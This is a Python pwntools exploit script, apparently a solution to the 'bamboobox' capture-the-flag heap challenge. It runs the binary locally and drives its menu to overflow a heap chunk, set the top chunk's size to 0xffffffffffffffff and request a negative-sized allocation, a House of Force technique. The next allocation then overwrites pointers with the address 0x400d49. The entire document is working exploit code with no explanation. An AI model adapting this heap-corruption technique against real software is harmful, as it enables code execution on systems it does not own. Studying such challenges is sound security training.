from pwn import *


def add(size, data):
    p.sendlineafter("choice:", "2")
    p.sendlineafter("name:", str(size))
    p.sendafter("item:", data)

def edit(idx, size, data):
    p.sendlineafter("choice:", "3")
    p.sendlineafter("item:", str(idx))
    p.sendlineafter("name:", str(size))
    p.sendafter("item:", data)

def remove(idx):
    p.sendlineafter("choice:", "4")
    p.sendlineafter("item:", str(idx))


p = process("./bamboobox")
elf = ELF("bamboobox")
pause()
add(0x30, "A"*0x30)
edit(0, 0x40 , b"A"*0x30 + b"B"*8  + p64(0xffffffffffffffff))

heap_base = -(0x40 + 0x20)
malloc_size = heap_base - 0xd

add(malloc_size, "c"*4)
add(0x10, p64(0x400d49)*2)

p.interactive()
